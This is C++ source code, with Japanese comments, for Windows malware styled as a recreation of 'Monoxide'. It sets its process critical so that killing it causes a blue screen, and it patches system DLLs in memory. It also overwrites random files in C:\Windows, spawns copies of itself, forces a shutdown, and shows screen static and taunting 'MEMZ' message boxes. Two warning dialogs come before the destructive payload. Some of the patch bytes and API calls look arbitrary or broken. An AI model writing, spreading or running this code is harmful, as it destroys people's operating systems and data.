#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <winternl.h>
#include <mmsystem.h>
#include <stdio.h>
#include <tlhelp32.h>
#include <psapi.h>
#include <vector>
#include <string>
#include <thread>
#include <random>
#include <chrono>

#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "winmm.lib")
#pragma comment(lib, "advapi32.lib")

// NTDLLの未公開関数の宣言
typedef NTSTATUS (NTAPI *pRtlAdjustPrivilege)(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN Enabled);
typedef NTSTATUS (NTAPI *pRtlSetProcessIsCritical)(BOOLEAN NewValue, PBOOLEAN OldValue, BOOLEAN IsWinlogon);
typedef NTSTATUS (NTAPI *pNtShutdownSystem)(ULONG Action);
typedef NTSTATUS (NTAPI *pNtSetSystemPowerState)(ULONG Action, BOOLEAN Flag);

// グローバル変数
bool g_running = true;
int g_screenWidth = GetSystemMetrics(SM_CXSCREEN);
int g_screenHeight = GetSystemMetrics(SM_CYSCREEN);
HWND g_hwndMain = NULL;
HANDLE g_hProcess = NULL;
std::mt19937 gen(std::random_device{}());
std::uniform_int_distribution<> dis(0, 255);

// 音声データ（簡易的なビープ音を生成）
void GenerateBeepWave(std::vector<BYTE>& buffer, DWORD duration, DWORD frequency) {
    DWORD samplesPerSec = 44100;
    DWORD numSamples = samplesPerSec * duration / 1000;
    buffer.resize(numSamples * 2); // 16-bit stereo
    
    for (DWORD i = 0; i < numSamples; i++) {
        double t = (double)i / samplesPerSec;
        short sample = (short)(32767 * sin(2 * 3.14159 * frequency * t));
        buffer[i*2] = sample & 0xFF;
        buffer[i*2+1] = (sample >> 8) & 0xFF;
    }
}

// 音声再生
void PlayMaliciousSound() {
    HWAVEOUT hWaveOut;
    WAVEFORMATEX wfx = {};
    wfx.wFormatTag = WAVE_FORMAT_PCM;
    wfx.nChannels = 2;
    wfx.nSamplesPerSec = 44100;
    wfx.wBitsPerSample = 16;
    wfx.nBlockAlign = wfx.nChannels * wfx.wBitsPerSample / 8;
    wfx.nAvgBytesPerSec = wfx.nSamplesPerSec * wfx.nBlockAlign;
    
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    
    std::vector<BYTE> soundData;
    GenerateBeepWave(soundData, 500, 440); // 440Hz, 500ms
    
    WAVEHDR wh = {};
    wh.lpData = (LPSTR)soundData.data();
    wh.dwBufferLength = soundData.size();
    wh.dwFlags = 0;
    
    waveOutPrepareHeader(hWaveOut, &wh, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &wh, sizeof(WAVEHDR));
    
    Sleep(1000);
    waveOutClose(hWaveOut);
}

// プロセスを強制終了させるとBSODになるように設定
void MakeProcessCritical() {
    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    if (!hNtdll) return;
    
    auto RtlAdjustPrivilege = (pRtlAdjustPrivilege)GetProcAddress(hNtdll, "RtlAdjustPrivilege");
    auto RtlSetProcessIsCritical = (pRtlSetProcessIsCritical)GetProcAddress(hNtdll, "RtlSetProcessIsCritical");
    
    if (!RtlAdjustPrivilege || !RtlSetProcessIsCritical) return;
    
    BOOLEAN enabled;
    // SE_DEBUG_PRIVILEGEを有効化
    RtlAdjustPrivilege(20, TRUE, FALSE, &enabled);
    
    // プロセスをクリティカルに設定 → 強制終了でBSOD
    RtlSetProcessIsCritical(TRUE, &enabled, FALSE);
    
    MessageBoxW(NULL, L"このプロセスはクリティカルになりました。\n終了させるとBSODが発生します。", L"警告", MB_OK | MB_ICONWARNING);
}

// DLLにフックを仕掛ける（他のプロセスの動作を改変）
void HookSystemDLLs() {
    // SSPICLI.DLL (セキュリティ) にパッチ
    HMODULE hSspiCli = LoadLibraryW(L"SSPICLI.DLL");
    if (hSspiCli) {
        BYTE patch[] = {0x48, 0xB8, 0x10, 0x16, 0x95, 0xF7, 0xFE, 0x07, 0x00, 0x00, 0xFF, 0xE0}; // ジャンプコード
        DWORD oldProtect;
        VirtualProtect(hSspiCli, 0x1000, PAGE_EXECUTE_READWRITE, &oldProtect);
        memcpy((void*)((DWORD_PTR)hSspiCli + 0x1000), patch, sizeof(patch));
        VirtualProtect(hSspiCli, 0x1000, oldProtect, &oldProtect);
    }
    
    // WS2_32.DLL (ネットワーク) にパッチ
    HMODULE hWs2_32 = LoadLibraryW(L"WS2_32.DLL");
    if (hWs2_32) {
        BYTE patch[] = {0x48, 0xB8, 0xE0, 0x11, 0x95, 0xF7, 0xFE, 0x07, 0x00, 0x00, 0xFF, 0xE0};
        DWORD oldProtect;
        VirtualProtect(hWs2_32, 0x1000, PAGE_EXECUTE_READWRITE, &oldProtect);
        memcpy((void*)((DWORD_PTR)hWs2_32 + 0x1000), patch, sizeof(patch));
        VirtualProtect(hWs2_32, 0x1000, oldProtect, &oldProtect);
    }
}

// ファイルを削除・破壊
void DestroyFiles() {
    // Windowsディレクトリ内のファイルを探索
    WIN32_FIND_DATAW findData;
    HANDLE hFind = FindFirstFileW(L"C:\\Windows\\*", &findData);
    
    if (hFind != INVALID_HANDLE_VALUE) {
        do {
            // ランダムにファイルを削除（危険）
            if (dis(gen) < 50) { // 20%の確率
                std::wstring filePath = L"C:\\Windows\\";
                filePath += findData.cFileName;
                
                if (!(findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
                    // ファイルを開いて破壊的書き込み
                    HANDLE hFile = CreateFileW(filePath.c_str(), GENERIC_WRITE, 0, NULL, 
                                               OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
                    if (hFile != INVALID_HANDLE_VALUE) {
                        BYTE garbage[1024] = {0};
                        memset(garbage, 0xFF, sizeof(garbage));
                        WriteFile(hFile, garbage, sizeof(garbage), NULL, NULL);
                        CloseHandle(hFile);
                    }
                }
            }
        } while (FindNextFileW(hFind, &findData) && g_running);
        FindClose(hFind);
    }
    
    // ディレクトリ削除の試行
    RemoveDirectoryW(L"C:\\Windows\\Temp\\MaliciousDir");
}

// シャットダウンまたは電源状態変更
void SystemPowerControl() {
    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    if (!hNtdll) return;
    
    auto NtShutdownSystem = (pNtShutdownSystem)GetProcAddress(hNtdll, "NtShutdownSystem");
    auto NtSetSystemPowerState = (pNtSetSystemPowerState)GetProcAddress(hNtdll, "NtSetSystemPowerState");
    
    if (NtShutdownSystem && dis(gen) < 30) {
        NtShutdownSystem(2); // シャットダウン
    }
    
    if (NtSetSystemPowerState && dis(gen) < 20) {
        NtSetSystemPowerState(1, FALSE); // 電源状態変更
    }
}

// 砂嵐エフェクト
void SandstormEffect() {
    HDC hdcScreen = GetDC(NULL);
    auto startTime = std::chrono::steady_clock::now();
    
    while (g_running) {
        auto now = std::chrono::steady_clock::now();
        if (std::chrono::duration_cast<std::chrono::seconds>(now - startTime).count() > 30) break;
        
        for (int y = 0; y < g_screenHeight; y += 4) {
            for (int x = 0; x < g_screenWidth; x += 4) {
                int gray = dis(gen) % 256;
                HBRUSH brush = CreateSolidBrush(RGB(gray, gray, gray));
                RECT rect = {x, y, x + 4, y + 4};
                FillRect(hdcScreen, &rect, brush);
                DeleteObject(brush);
            }
        }
        Sleep(30);
    }
    ReleaseDC(NULL, hdcScreen);
}

// マウス追従メッセージ
void FollowMouseMessageBox() {
    HWND hwndMsgBox = NULL;
    POINT cursorPos;
    
    const wchar_t* messages[] = {
        L"YOU KILLED MY TROJAN!",
        L"REST IN PISS, FOREVER MISS",
        L"HAHA N00B L2P G3T R3KT",
        L"GET BETTER HAX NEXT TIME xD",
        L"|\\/|3|\\/|2",
        L"BSOD INCOMING"
    };
    
    std::thread msgThread([&hwndMsgBox, messages]() {
        int idx = dis(gen) % 6;
        MessageBox(hwndMsgBox, messages[idx], L"MEMZ", MB_ICONERROR | MB_OK);
    });
    
    Sleep(100);
    while (g_running && hwndMsgBox == NULL) {
        hwndMsgBox = FindWindow(L"#32770", NULL);
        Sleep(50);
    }
    
    if (hwndMsgBox) {
        SetWindowLong(hwndMsgBox, GWL_EXSTYLE, 
                     GetWindowLong(hwndMsgBox, GWL_EXSTYLE) | WS_EX_TOPMOST);
        
        auto startTime = std::chrono::steady_clock::now();
        while (g_running && IsWindow(hwndMsgBox)) {
            GetCursorPos(&cursorPos);
            RECT rect;
            GetWindowRect(hwndMsgBox, &rect);
            int width = rect.right - rect.left;
            int height = rect.bottom - rect.top;
            
            SetWindowPos(hwndMsgBox, HWND_TOPMOST, 
                        cursorPos.x - width/2, cursorPos.y - height/2,
                        width, height, SWP_NOSIZE);
            Sleep(10);
        }
    }
    
    if (msgThread.joinable()) msgThread.join();
}

// プロセス生成（自己複製）
void SpawnProcesses() {
    wchar_t exePath[MAX_PATH];
    GetModuleFileNameW(NULL, exePath, MAX_PATH);
    
    for (int i = 0; i < 3 && g_running; i++) {
        STARTUPINFOW si = {sizeof(si)};
        PROCESS_INFORMATION pi;
        
        if (CreateProcessW(exePath, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
        }
        Sleep(1000);
    }
}

// メインウィンドウプロシージャ
LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    switch (msg) {
        case WM_DESTROY:
            g_running = false;
            PostQuitMessage(0);
            return 0;
    }
    return DefWindowProc(hwnd, msg, wParam, lParam);
}

// 全機能実行
void RunFullMonoxide() {
    // 二重警告
    int firstWarn = MessageBoxW(NULL, 
        L"⚠ 最終警告 ⚠\n\n"
        L"これは Monoxidex64.exe の完全再現プログラムです。\n"
        L"以下の危険な動作を含みます：\n"
        L"・BSODの誘発\n"
        L"・DLLの改変\n"
        L"・ファイルの破壊\n"
        L"・強制シャットダウン\n\n"
        L"実行するとシステムが復旧不能になる可能性があります。\n"
        L"本当に実行しますか？", 
        L"FATAL WARNING", MB_YESNO | MB_ICONERROR | MB_DEFBUTTON2);
    
    if (firstWarn != IDYES) return;
    
    int finalConfirm = MessageBoxW(NULL, 
        L"⚠ 最終確認 ⚠\n\n"
        L"このプログラムを実行した結果については一切責任を負えません。\n"
        L"最後の機会です。続行しますか？", 
        L"FINAL CONFIRMATION", MB_YESNO | MB_ICONWARNING | MB_DEFBUTTON2);
    
    if (finalConfirm != IDYES) return;
    
    // ここから本番動作
    std::vector<std::thread> threads;
    
    // 1. プロセスをクリティカルに設定（BSOD誘発）
    MakeProcessCritical();
    
    // 2. 音声再生
    PlayMaliciousSound();
    
    // 3. DLLにフック
    HookSystemDLLs();
    
    // 4. 視覚効果スレッド開始
    threads.push_back(std::thread(SandstormEffect));
    threads.push_back(std::thread(FollowMouseMessageBox));
    
    // 5. ファイル破壊
    DestroyFiles();
    
    // 6. 自己複製
    SpawnProcesses();
    
    // 7. 電源制御
    SystemPowerControl();
    
    for (auto& t : threads) {
        if (t.joinable()) t.join();
    }
}

// WinMain
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    // ウィンドウ作成（最小限）
    WNDCLASS wc = {};
    wc.lpfnWndProc = WndProc;
    wc.hInstance = hInstance;
    wc.lpszClassName = L"MonoxideMain";
    RegisterClass(&wc);
    
    g_hwndMain = CreateWindowEx(0, L"MonoxideMain", L"Monoxide64", 
                                WS_OVERLAPPEDWINDOW, 100, 100, 400, 300,
                                NULL, NULL, hInstance, NULL);
    
    ShowWindow(g_hwndMain, SW_SHOW);
    
    // メインスレッドでMonoxide実行
    RunFullMonoxide();
    
    // メッセージループ
    MSG msg;
    while (g_running && GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    
    return 0;
}
